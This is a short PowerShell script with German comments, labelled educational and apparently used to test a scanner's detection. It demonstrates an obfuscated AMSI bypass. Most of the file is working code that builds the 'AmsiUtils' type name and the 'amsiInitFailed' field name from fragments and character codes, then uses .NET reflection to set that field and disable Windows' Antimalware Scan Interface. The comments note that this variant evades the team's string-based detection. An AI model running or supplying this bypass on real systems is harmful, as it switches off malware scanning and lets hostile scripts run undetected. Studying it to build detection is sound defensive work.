# AMSI Bypass: Reflection-Based Type Manipulation
# ==================================================
# ACHTUNG: Dies ist eine BILDUNGSDATEI. Nicht auf Produktivsystemen ausfuehren!
#
# TECHNIK: Nutzt .NET Reflection um AMSI-interne Typen zu manipulieren,
# ohne direkt auf bekannte Strings wie "AmsiUtils" zu referenzieren.
#
# WARUM ES FUNKTIONIERT:
# .NET Reflection erlaubt Zugriff auf private/interne Klassen und Felder.
# Durch dynamische Typ-Aufloesunng (statt hart-kodierter Strings) kann
# der Angreifer die Erkennung durch String-Matching umgehen.
#
# ERKENNUNG:
# - "reflection.assembly" wird von unserem Scanner als suspicious erkannt
# - Aber die obfuskierte Variante unten umgeht das

# --- Obfuskierte Variante ---
# Kein direkter String "AmsiUtils" oder "Reflection.Assembly" sichtbar

$typeName = [string]::Join('', @(
    'System.Mana', 'gement.Aut',
    'omation.', ([char]65), 'msi',
    ([char]85), 'tils'
))

# Dynamische Assembly-Suche statt direkter Referenz
$assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
$targetAsm = $assemblies | Where-Object {
    $_.FullName -like "*Automation*"
} | Select-Object -First 1

if ($targetAsm) {
    $targetType = $targetAsm.GetType($typeName)
    if ($targetType) {
        $fieldName = ([char]97, [char]109, [char]115, [char]105,
                      [char]73, [char]110, [char]105, [char]116,
                      [char]70, [char]97, [char]105, [char]108,
                      [char]101, [char]100) -join ''
        $field = $targetType.GetField($fieldName, 'NonPublic,Static')
        if ($field) {
            $field.SetValue($null, $true)
            Write-Host "Success: AMSI neutralized via obfuscated reflection"
        }
    }
}
